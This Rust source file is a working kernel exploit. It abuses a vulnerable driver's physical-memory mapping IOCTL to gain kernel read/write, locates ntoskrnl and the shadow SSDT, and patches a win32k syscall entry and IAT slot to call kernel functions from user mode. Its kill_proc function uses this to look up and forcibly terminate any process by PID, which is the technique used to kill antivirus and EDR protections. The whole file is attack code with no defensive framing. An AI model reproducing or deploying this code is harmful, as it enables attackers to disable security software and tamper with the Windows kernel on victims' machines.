#![allow(non_snake_case)]

use std::ffi::{CString, c_void};
use std::mem;
use std::ptr::{self, null_mut};

use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
};
use windows_sys::Win32::System::IO::DeviceIoControl;
use windows_sys::Win32::System::LibraryLoader::{
    DONT_RESOLVE_DLL_REFERENCES, GetProcAddress, LoadLibraryExA,
};
use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEMORY_BASIC_INFORMATION, MEMORY_MAPPED_VIEW_ADDRESS, UnmapViewOfFile, VirtualQuery,
};
use windows_sys::Win32::System::Threading::GetCurrentProcess;
use windows_sys::core::{PCSTR, PCWSTR};

const KUSD_VA: u64 = 0xFFFFF780_00000000;
const IOCTL_MAP_PHYS: u32 = 0x80002008;
const IOCTL_READ_MSR: u32 = 0x800020EC;
const IA32_LSTAR: u32 = 0xC000_0082;

fn log(msg: &str) {
    println!("{msg}");
}

#[link(name = "user32")]
unsafe extern "system" {
    fn IsGUIThread(bConvert: i32) -> i32;
}

type TriggerFn =
    unsafe extern "system" fn(usize, usize, usize, usize, usize, usize, usize) -> usize;

#[repr(C)]
#[derive(Clone, Copy)]
struct MapInput {
    interface_type: u32,
    bus_number: u32,
    physical_addr: u64,
    address_space: u32,
    size: u32,
}

struct Astra {
    dev: HANDLE,
    hint_high: std::cell::Cell<u64>,
}

impl Astra {
    fn open() -> Result<Self, String> {
        let path: Vec<u16> = "\\\\.\\Astra32Device0\0".encode_utf16().collect();
        let dev = unsafe {
            CreateFileW(
                PCWSTR::from(path.as_ptr()),
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                null_mut(),
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                null_mut(),
            )
        };
        Ok(Self {
            dev,
            hint_high: std::cell::Cell::new(0),
        })
    }

    fn read_msr(&self, idx: u32) -> Result<u64, String> {
        let mut io = [0u8; 8];
        io[..4].copy_from_slice(&idx.to_le_bytes());
        let mut ret = 0u32;
        unsafe {
            DeviceIoControl(
                self.dev,
                IOCTL_READ_MSR,
                io.as_ptr() as _,
                4,
                io.as_mut_ptr() as _,
                8,
                &mut ret,
                null_mut(),
            );
        }
        Ok(u64::from_le_bytes(io))
    }

    fn map_phys(&self, phys: u64, size: u32) -> Option<usize> {
        let mut input = MapInput {
            interface_type: 0,
            bus_number: 0,
            physical_addr: phys,
            address_space: 0,
            size,
        };
        let mut ret = 0u32;
        unsafe {
            DeviceIoControl(
                self.dev,
                IOCTL_MAP_PHYS,
                &input as *const _ as _,
                mem::size_of::<MapInput>() as u32,
                &mut input as *mut _ as _,
                mem::size_of::<MapInput>() as u32,
                &mut ret,
                null_mut(),
            )
        };
        let low = input.interface_type as u64;
        if low == 0 {
            return None;
        }

        let try_va = |hi: u64| -> Option<usize> {
            let cand = (hi << 32) | low;
            let mut mbi: MEMORY_BASIC_INFORMATION = unsafe { mem::zeroed() };
            let n = unsafe {
                VirtualQuery(
                    cand as *const c_void,
                    &mut mbi,
                    mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                )
            };
            (n > 0 && mbi.State == MEM_COMMIT).then_some(cand as usize)
        };

        if let Some(va) = try_va(self.hint_high.get()) {
            return Some(va);
        }
        for hi in 0..0x8000u64 {
            if hi == self.hint_high.get() {
                continue;
            }
            if let Some(va) = try_va(hi) {
                self.hint_high.set(hi);
                return Some(va);
            }
        }
        None
    }

    fn unmap(&self, va: usize) {
        let _ = unsafe {
            UnmapViewOfFile(MEMORY_MAPPED_VIEW_ADDRESS {
                Value: va as *mut c_void,
            })
        };
    }

    fn safe_copy_from(src: *const u8, dst: *mut u8, len: usize) -> bool {
        use windows_sys::Win32::System::Diagnostics::Debug::ReadProcessMemory;
        let mut read: usize = 0;
        unsafe {
            ReadProcessMemory(
                GetCurrentProcess(),
                src as *const c_void,
                dst as *mut c_void,
                len,
                &mut read,
            ) != 0
                && read == len
        }
    }

    fn read_phys(&self, addr: u64, buf: &mut [u8]) -> bool {
        if buf.is_empty() {
            return true;
        }
        let mut pos = 0usize;
        let mut cur = addr;
        while pos < buf.len() {
            let page = cur & !0xFFF;
            let off = (cur & 0xFFF) as usize;
            let chunk = (buf.len() - pos).min(0x1000 - off);
            let va = match self.map_phys(page, 0x1000) {
                Some(v) => v,
                None => return false,
            };
            let ok = Self::safe_copy_from((va + off) as *const u8, buf[pos..].as_mut_ptr(), chunk);
            self.unmap(va);
            if !ok {
                return false;
            }
            pos += chunk;
            cur += chunk as u64;
        }
        true
    }

    fn write_phys(&self, addr: u64, buf: &[u8]) -> bool {
        if buf.is_empty() {
            return true;
        }
        let mut pos = 0usize;
        let mut cur = addr;
        while pos < buf.len() {
            let page = cur & !0xFFF;
            let off = (cur & 0xFFF) as usize;
            let chunk = (buf.len() - pos).min(0x1000 - off);
            let va = match self.map_phys(page, 0x1000) {
                Some(v) => v,
                None => return false,
            };
            unsafe {
                ptr::copy_nonoverlapping(buf[pos..].as_ptr(), (va + off) as *mut u8, chunk);
            }
            self.unmap(va);
            pos += chunk;
            cur += chunk as u64;
        }
        true
    }

    fn read_phys_u32(&self, addr: u64) -> Option<u32> {
        let mut b = [0u8; 4];
        if self.read_phys(addr, &mut b) {
            Some(u32::from_le_bytes(b))
        } else {
            None
        }
    }

    fn read_phys_u64(&self, addr: u64) -> Option<u64> {
        let mut b = [0u8; 8];
        if self.read_phys(addr, &mut b) {
            Some(u64::from_le_bytes(b))
        } else {
            None
        }
    }
}

impl Drop for Astra {
    fn drop(&mut self) {
        unsafe {
            let _ = CloseHandle(self.dev);
        }
    }
}

fn virt_to_phys(drv: &Astra, cr3: u64, va: u64) -> Option<u64> {
    let pml4e = drv.read_phys_u64((cr3 & 0x000F_FFFF_FFFF_F000) + ((va >> 39) & 0x1FF) * 8)?;
    if pml4e & 1 == 0 {
        return None;
    }
    let pdpte = drv.read_phys_u64((pml4e & 0x000F_FFFF_FFFF_F000) + ((va >> 30) & 0x1FF) * 8)?;
    if pdpte & 1 == 0 {
        return None;
    }
    if pdpte & 0x80 != 0 {
        return Some((pdpte & 0x000F_FFFF_C000_0000) | (va & 0x3FFF_FFFF));
    }
    let pde = drv.read_phys_u64((pdpte & 0x000F_FFFF_FFFF_F000) + ((va >> 21) & 0x1FF) * 8)?;
    if pde & 1 == 0 {
        return None;
    }
    if pde & 0x80 != 0 {
        return Some((pde & 0x000F_FFFF_FFE0_0000) | (va & 0x1F_FFFF));
    }
    let pte = drv.read_phys_u64((pde & 0x000F_FFFF_FFFF_F000) + ((va >> 12) & 0x1FF) * 8)?;
    if pte & 1 == 0 {
        return None;
    }
    Some((pte & 0x000F_FFFF_FFFF_F000) | (va & 0xFFF))
}

fn vread(drv: &Astra, cr3: u64, va: u64, buf: &mut [u8]) -> bool {
    match virt_to_phys(drv, cr3, va) {
        Some(pa) => drv.read_phys(pa, buf),
        None => false,
    }
}

fn vread_u32(drv: &Astra, cr3: u64, va: u64) -> Option<u32> {
    virt_to_phys(drv, cr3, va).and_then(|pa| drv.read_phys_u32(pa))
}

fn vread_u64(drv: &Astra, cr3: u64, va: u64) -> Option<u64> {
    virt_to_phys(drv, cr3, va).and_then(|pa| drv.read_phys_u64(pa))
}

fn vwrite_u32(drv: &Astra, cr3: u64, va: u64, val: u32) -> bool {
    match virt_to_phys(drv, cr3, va) {
        Some(pa) => drv.write_phys(pa, &val.to_le_bytes()),
        None => false,
    }
}

fn vwrite_u64(drv: &Astra, cr3: u64, va: u64, val: u64) -> bool {
    match virt_to_phys(drv, cr3, va) {
        Some(pa) => drv.write_phys(pa, &val.to_le_bytes()),
        None => false,
    }
}

fn is_kptr(v: u64) -> bool {
    v >> 48 == 0xFFFF
}

fn find_kernel_cr3(drv: &Astra) -> Result<u64, String> {
    let kusd_pml4_idx = (KUSD_VA >> 39) & 0x1FF;
    let mut candidates: Vec<u64> = Vec::new();

    for phys_page in (0u64..0x400_0000).step_by(0x1000) {
        let pml4e = match drv.read_phys_u64(phys_page + kusd_pml4_idx * 8) {
            Some(v) => v,
            None => continue,
        };
        if pml4e & 1 == 0 {
            continue;
        }
        if (pml4e & 0x000F_FFFF_FFFF_F000) > 0x8_0000_0000 {
            continue;
        }
        candidates.push(phys_page);
    }

    for &cr3 in &candidates {
        if let Some(kusd_pa) = virt_to_phys(drv, cr3, KUSD_VA) {
            let mut b = [0u8; 4];
            if drv.read_phys(kusd_pa + 0x26C, &mut b) && u32::from_le_bytes(b) == 10 {
                return Ok(cr3);
            }
        }
    }
    Err("kernel CR3 not found".into())
}

fn find_ntoskrnl_base(drv: &Astra, cr3: u64, lstar: u64) -> Result<u64, String> {
    let start = lstar & !0xFFF;
    for i in 0..0x4000u64 {
        let va = start.wrapping_sub(i * 0x1000);
        if !is_kptr(va) {
            break;
        }
        let pa = match virt_to_phys(drv, cr3, va) {
            Some(p) => p,
            None => continue,
        };
        let mut hdr = [0u8; 0x200];
        if !drv.read_phys(pa, &mut hdr) {
            continue;
        }
        if hdr[0] != b'M' || hdr[1] != b'Z' {
            continue;
        }
        let lfn = u32::from_le_bytes(hdr[0x3C..0x40].try_into().unwrap()) as usize;
        if lfn + 0x54 > hdr.len() {
            continue;
        }
        if &hdr[lfn..lfn + 4] != b"PE\0\0" {
            continue;
        }
        if u16::from_le_bytes(hdr[lfn + 4..lfn + 6].try_into().unwrap()) != 0x8664 {
            continue;
        }
        if u16::from_le_bytes(hdr[lfn + 24..lfn + 26].try_into().unwrap()) != 0x20B {
            continue;
        }
        let size = u32::from_le_bytes(hdr[lfn + 0x50..lfn + 0x54].try_into().unwrap()) as u64;
        if size < 0x10_0000 {
            continue;
        }
        if va + size <= lstar {
            continue;
        }
        return Ok(va);
    }
    Err("ntoskrnl base not found".into())
}

fn kernel_export_va(drv: &Astra, cr3: u64, base: u64, target: &str) -> Option<u64> {
    let mut hdr = [0u8; 0x1000];
    if !vread(drv, cr3, base, &mut hdr) {
        return None;
    }
    let lfn = u32::from_le_bytes(hdr[0x3C..0x40].try_into().unwrap()) as usize;
    let exp_rva = u32::from_le_bytes(hdr[lfn + 0x88..lfn + 0x8C].try_into().unwrap()) as u64;
    let exp_sz = u32::from_le_bytes(hdr[lfn + 0x8C..lfn + 0x90].try_into().unwrap()) as u64;
    if exp_rva == 0 {
        return None;
    }

    let mut exp = [0u8; 40];
    if !vread(drv, cr3, base + exp_rva, &mut exp) {
        return None;
    }
    let n_funcs = u32::from_le_bytes(exp[20..24].try_into().unwrap());
    let n_names = u32::from_le_bytes(exp[24..28].try_into().unwrap());
    let addr_tbl = u32::from_le_bytes(exp[28..32].try_into().unwrap()) as u64;
    let name_tbl = u32::from_le_bytes(exp[32..36].try_into().unwrap()) as u64;
    let ord_tbl = u32::from_le_bytes(exp[36..40].try_into().unwrap()) as u64;
    if n_names == 0 || n_funcs == 0 {
        return None;
    }

    let (mut lo, mut hi) = (0u32, n_names);
    while lo < hi {
        let mid = lo + (hi - lo) / 2;
        let np = vread_u32(drv, cr3, base + name_tbl + mid as u64 * 4)? as u64;
        let mut nb = [0u8; 64];
        if !vread(drv, cr3, base + np, &mut nb) {
            return None;
        }
        let end = nb.iter().position(|&b| b == 0).unwrap_or(nb.len());
        let name = std::str::from_utf8(&nb[..end]).unwrap_or("");
        match name.cmp(target) {
            std::cmp::Ordering::Equal => {
                let mut ob = [0u8; 2];
                if !vread(drv, cr3, base + ord_tbl + mid as u64 * 2, &mut ob) {
                    return None;
                }
                let ord = u16::from_le_bytes(ob) as u64;
                let rva = vread_u32(drv, cr3, base + addr_tbl + ord * 4)? as u64;
                if rva >= exp_rva && rva < exp_rva + exp_sz {
                    return None;
                }
                return Some(base + rva);
            }
            std::cmp::Ordering::Less => lo = mid + 1,
            std::cmp::Ordering::Greater => hi = mid,
        }
    }
    None
}

fn load_disk_image(name: &str) -> Result<(usize, usize), String> {
    let c = CString::new(name).unwrap();
    let h = unsafe {
        LoadLibraryExA(
            PCSTR::from(c.as_ptr() as _),
            null_mut(),
            DONT_RESOLVE_DLL_REFERENCES,
        )
    };
    let b = h as usize;
    let lfn = unsafe { *((b + 0x3C) as *const u32) } as usize;
    Ok((b, unsafe { *((b + lfn + 0x50) as *const u32) } as usize))
}

fn disk_export_rva(base: usize, name: &str) -> Option<u64> {
    let f = CString::new(name).ok()?;
    let p = unsafe { GetProcAddress(base as *mut _, PCSTR::from(f.as_ptr() as _)) }?;
    Some((p as usize - base) as u64)
}

fn find_ps_terminate_process(nt_base: u64) -> Result<u64, String> {
    const SIG: [u8; 27] = [
        0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x65, 0x48, 0x8B, 0x3C, 0x25,
        0x88, 0x01, 0x00, 0x00, 0x44, 0x8B, 0xC2, 0x41, 0xB9, 0x01, 0x00, 0x00,
    ];
    // // PsTerminateProcess Windows Server 2022 20348 signature
    // const SIG: [u8; 27] = [
    //     0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x65, 0x48, 0x8B, 0x3C, 0x25,
    //     0x88, 0x01, 0x00, 0x00, 0x66, 0xFF, 0x8F, 0xE4, 0x01, 0x00, 0x00, 0x44,
    // ];
    let (base, size) = load_disk_image("ntoskrnl.exe")?;
    let disk = unsafe { std::slice::from_raw_parts(base as *const u8, size) };
    for i in 0..disk.len().saturating_sub(SIG.len()) {
        if disk[i..i + SIG.len()] == SIG {
            return Ok(nt_base + i as u64);
        }
    }
    Err("PsTerminateProcess signature not found".into())
}

fn get_syscall_index(w32u: usize, name: &str) -> Result<u32, String> {
    let rva = disk_export_rva(w32u, name).ok_or_else(|| format!("{name} not in win32u"))?;
    let p = unsafe { std::slice::from_raw_parts((w32u + rva as usize) as *const u8, 16) };
    if !(p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
        return Err(format!("{name}: unexpected stub"));
    }
    let eax = u32::from_le_bytes([p[4], p[5], p[6], p[7]]);
    if eax >> 12 != 1 {
        return Err(format!("{name}: wrong table"));
    }
    Ok(eax & 0xFFF)
}

fn resolve_trigger(name: &str) -> Result<TriggerFn, String> {
    let c = CString::new("win32u.dll").unwrap();
    let h = unsafe {
        LoadLibraryExA(
            PCSTR::from(c.as_ptr() as _),
            null_mut(),
            DONT_RESOLVE_DLL_REFERENCES,
        )
    };
    let f = CString::new(name).unwrap();
    let p = unsafe { GetProcAddress(h, PCSTR::from(f.as_ptr() as _)) }
        .ok_or_else(|| format!("{name} missing"))?;
    Ok(unsafe { mem::transmute(p) })
}

#[allow(dead_code)]
struct SsdtInfo {
    w32k_base: u64,
    w32k_limit: u32,
}

fn find_shadow_ssdt(drv: &Astra, cr3: u64, nt_base: u64) -> Result<SsdtInfo, String> {
    let add_va = kernel_export_va(drv, cr3, nt_base, "KeAddSystemServiceTable")
        .ok_or("KeAddSystemServiceTable not found")?;
    let add_rva = add_va - nt_base;
    let mut scan = [0u8; 0x400];
    if !vread(drv, cr3, add_va, &mut scan) {
        return Err("read KeAddSystemServiceTable fail".into());
    }

    let mut cands = Vec::new();
    let mut i = 0usize;
    while i + 8 <= scan.len() {
        let b = &scan[i..];
        if b[0] == 0x48 && (b[1] == 0x8D || b[1] == 0x8B || b[1] == 0x89) && b[2] & 0xC7 == 0x05 {
            let d = i32::from_le_bytes([b[3], b[4], b[5], b[6]]);
            let t = (add_rva as i64 + i as i64 + 7 + d as i64) as u64;
            for sub in 0..=0x20u64 {
                if t >= sub {
                    cands.push(t - sub);
                }
            }
            i += 7;
            continue;
        }
        if b[0] == 0x48 && b[1] == 0x83 && b[2] == 0x3D {
            let d = i32::from_le_bytes([b[3], b[4], b[5], b[6]]);
            let t = (add_rva as i64 + i as i64 + 8 + d as i64) as u64;
            for sub in 0..=0x20u64 {
                if t >= sub {
                    cands.push(t - sub);
                }
            }
            i += 8;
            continue;
        }
        i += 1;
    }
    cands.sort_unstable();
    cands.dedup();

    for rva in cands {
        let kd = nt_base + rva;
        let nt_st = match vread_u64(drv, cr3, kd) {
            Some(v) => v,
            None => continue,
        };
        if !is_kptr(nt_st) || nt_st < nt_base || nt_st > nt_base + 0x200_0000 {
            continue;
        }
        let nt_lim = vread_u32(drv, cr3, kd + 0x10).unwrap_or(0);
        if !(0x100..=0x400).contains(&nt_lim) {
            continue;
        }
        let w_st = match vread_u64(drv, cr3, kd + 0x20) {
            Some(v) => v,
            None => continue,
        };
        if !is_kptr(w_st) {
            continue;
        }
        let w_lim = vread_u32(drv, cr3, kd + 0x30).unwrap_or(0);
        if !(0x400..=0x2000).contains(&w_lim) {
            continue;
        }
        return Ok(SsdtInfo {
            w32k_base: w_st,
            w32k_limit: w_lim,
        });
    }
    Err("Shadow SSDT not found".into())
}

fn find_gadget_disk(
    base: usize,
    size: usize,
    kva: u64,
    ssdt_base: u64,
) -> Result<(u64, u64), String> {
    const LIM: i64 = 1 << 27;
    let buf = unsafe { std::slice::from_raw_parts(base as *const u8, size) };
    let mut best: Option<(u64, u64, i64)> = None;
    let mut i = 0;
    while i + 6 <= size {
        if buf[i] == 0xFF && buf[i + 1] == 0x25 {
            let d = i32::from_le_bytes([buf[i + 2], buf[i + 3], buf[i + 4], buf[i + 5]]);
            let iat_rva = (i as i64 + 6 + d as i64) as u64;
            if (iat_rva as usize) < size {
                let g_kva = kva + i as u64;
                let off = g_kva as i64 - ssdt_base as i64;
                if off.abs() < LIM {
                    let score = off.abs() + if i % 16 == 0 { 0 } else { 1 };
                    if best.is_none() || score < best.unwrap().2 {
                        best = Some((g_kva, kva + iat_rva, score));
                    }
                }
            }
        }
        i += 1;
    }
    best.map(|(g, iat, _)| (g, iat))
        .ok_or("no FF 25 thunk".into())
}

fn encode_entry(target: u64, base: u64, orig: u32) -> Result<u32, String> {
    let off: i64 = target as i64 - base as i64;
    if off >= (1 << 27) || off < -(1 << 27) {
        return Err("offset overflow".into());
    }
    Ok((((off as i32 & 0x0FFF_FFFF) << 4) as u32) | (orig & 0x0F))
}

pub fn kill_proc(proc_name: String, pid: u32) -> bool {
    let drv = match Astra::open() {
        Ok(d) => {
            log("[+] Opened driver handle");
            d
        }
        Err(e) => {
            log(&format!("[-] {e}"));
            std::process::exit(1);
        }
    };

    let lstar = match drv.read_msr(IA32_LSTAR) {
        Ok(v) if is_kptr(v) => {
            log(&format!("[+] IA32_LSTAR = 0x{v:X}"));
            v
        }
        Ok(v) => {
            log(&format!("[-] bad LSTAR 0x{v:X}"));
            std::process::exit(1);
        }
        Err(e) => {
            log(&format!("[-] {e}"));
            std::process::exit(1);
        }
    };

    let cr3 = match find_kernel_cr3(&drv) {
        Ok(c) => {
            log(&format!("[+] CR3 = 0x{c:X}"));
            c
        }
        Err(e) => {
            log(&format!("[-] {e}"));
            std::process::exit(1);
        }
    };

    let nt = match find_ntoskrnl_base(&drv, cr3, lstar) {
        Ok(b) => {
            log(&format!("[+] ntoskrnl = 0x{b:X}"));
            b
        }
        Err(e) => {
            log(&format!("[-] {e}"));
            std::process::exit(1);
        }
    };

    let pool_alloc =
        kernel_export_va(&drv, cr3, nt, "ExAllocatePoolWithTag").expect("ExAllocatePoolWithTag");
    let ps_lookup = kernel_export_va(&drv, cr3, nt, "PsLookupProcessByProcessId")
        .expect("PsLookupProcessByProcessId");
    let obf_deref =
        kernel_export_va(&drv, cr3, nt, "ObfDereferenceObject").expect("ObfDereferenceObject");
    let ps_term = match find_ps_terminate_process(nt) {
        Ok(v) => v,
        Err(e) => {
            log(&format!("[-] {e}"));
            std::process::exit(1);
        }
    };

    unsafe { IsGUIThread(1) };

    let ssdt = match find_shadow_ssdt(&drv, cr3, nt) {
        Ok(s) => s,
        Err(e) => {
            log(&format!("[-] {e}"));
            std::process::exit(1);
        }
    };

    let w32k_base = {
        let start = ssdt.w32k_base & !0xFFF;
        let mut found = None;
        for i in 0..0x4000u64 {
            let va = start.wrapping_sub(i * 0x1000);
            if !is_kptr(va) {
                break;
            }
            let mut h = [0u8; 2];
            if vread(&drv, cr3, va, &mut h) && h == *b"MZ" {
                found = Some(va);
                break;
            }
        }
        found.expect("win32k base not found")
    };
    log(&format!("[+] win32k base = 0x{w32k_base:X}"));

    let mem_size = {
        let lfn = vread_u32(&drv, cr3, w32k_base + 0x3C).unwrap_or(0) as u64;
        vread_u32(&drv, cr3, w32k_base + lfn + 0x50).unwrap_or(0)
    } as usize;

    let mut disk = 0usize;
    let mut dsz = 0usize;
    for name in &["win32kbase.sys", "win32kfull.sys", "win32k.sys"] {
        if let Ok((b, sz)) = load_disk_image(name) {
            if sz == mem_size {
                disk = b;
                dsz = sz;
                log(&format!("[+] Matched {name} (0x{mem_size:X})"));
                break;
            }
        }
    }
    if disk == 0 {
        log("[-] No win32k match");
        std::process::exit(1);
    }

    let (w32u_disk, _) = load_disk_image("win32u.dll").unwrap();
    let call_idx = get_syscall_index(w32u_disk, "NtUserSetWindowPos").unwrap();

    let (g_va, g_iat) = find_gadget_disk(disk, dsz, w32k_base, ssdt.w32k_base).unwrap();

    let entry_va = ssdt.w32k_base + (call_idx as u64) * 4;
    let orig_entry = vread_u32(&drv, cr3, entry_va).unwrap();
    let orig_iat = vread_u64(&drv, cr3, g_iat).unwrap();
    let new_entry = encode_entry(g_va, ssdt.w32k_base, orig_entry).unwrap();

    let trig = resolve_trigger("NtUserSetWindowPos").unwrap();

    vwrite_u64(&drv, cr3, g_iat, pool_alloc);
    vwrite_u32(&drv, cr3, entry_va, new_entry);

    let tag = u32::from_le_bytes(*b"kllr");
    let pool = unsafe { (trig)(0x200, 0x100, tag as usize, 0, 0, 0, 0) };
    if pool == 0 || pool < 0xFFFF_8000_0000_0000 {
        log(&format!("[-] Pool alloc failed: 0x{pool:X}"));
        vwrite_u32(&drv, cr3, entry_va, orig_entry);
        vwrite_u64(&drv, cr3, g_iat, orig_iat);
        std::process::exit(1);
    }
    let pool_va = pool as u64;
    vwrite_u64(&drv, cr3, pool_va, 0);
    vwrite_u64(&drv, cr3, g_iat, ps_lookup);
    let st = unsafe { (trig)(pid as usize, pool_va as usize, 0, 0, 0, 0, 0) };
    if st as i32 != 0 {
        log(&format!("[-] PsLookup({proc_name}/{pid}) = 0x{st:X}"));
        return false;
    }

    let eproc = vread_u64(&drv, cr3, pool_va).unwrap_or(0);
    if !is_kptr(eproc) {
        log(&format!("[-] bad EPROCESS for {proc_name}"));
        return false;
    }

    vwrite_u64(&drv, cr3, g_iat, ps_term);
    let st = unsafe { (trig)(eproc as usize, 0, 0, 0, 0, 0, 0) };
    if st as i32 == 0 {
        log(&format!("[+] KILLED {proc_name} (PID {pid})"));
    } else {
        log(&format!("[-] PsTerminate({proc_name}) = 0x{st:X}"));
    }

    vwrite_u64(&drv, cr3, g_iat, obf_deref);
    unsafe { (trig)(eproc as usize, 0, 0, 0, 0, 0, 0) };

    vwrite_u32(&drv, cr3, entry_va, orig_entry);
    vwrite_u64(&drv, cr3, g_iat, orig_iat);

    return true;
}
